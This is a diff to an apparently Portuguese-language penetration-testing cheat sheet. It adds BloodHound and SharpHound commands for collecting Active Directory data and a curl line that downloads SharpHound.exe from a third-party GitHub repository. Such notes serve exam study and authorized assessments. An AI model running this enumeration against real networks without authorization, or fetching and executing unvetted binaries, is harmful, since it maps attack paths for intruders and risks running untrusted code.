@@ -826,9 +826,22 @@ Invoke-BloodHound -CollectionMethod ACL,ObjectProps
 Invoke-Bloodhound -collectionmethod DCOnly
 -CompressData -RemoveCSV and -NoSaveCache   --GERAR O ARQUIVO ZIP PARA ARRASRTAR NO BLOODHOUND
 ```
+##### BLOODHOUND - POWERSHELL COMANDOS PREFERIDOS
+```
+Invoke-BloodHound 
+Invoke-Bloodhound -collectionmethod all
+Invoke-Bloodhound -collectionmethod DCOnly
+Invoke-Bloodhound -collectionmethod Loggedon
+```
 ##### BLOODHOUND - SHARPHOUND
 ```
+curl https://github.com/n0ts0cial/oscp/raw/main/SharpHound.exe  -Outfile SharpHound.exe
+```
+```
 SharpHound.exe
+.\SharpHound.exe
+.\SharpHound.exe --collectionmethods DCOnly
+.\SharpHound.exe --collectionmethods Loggedon
 ```
 ##### BLOODHOUND - INICIAR
 NA CONSOLE DE ROOT
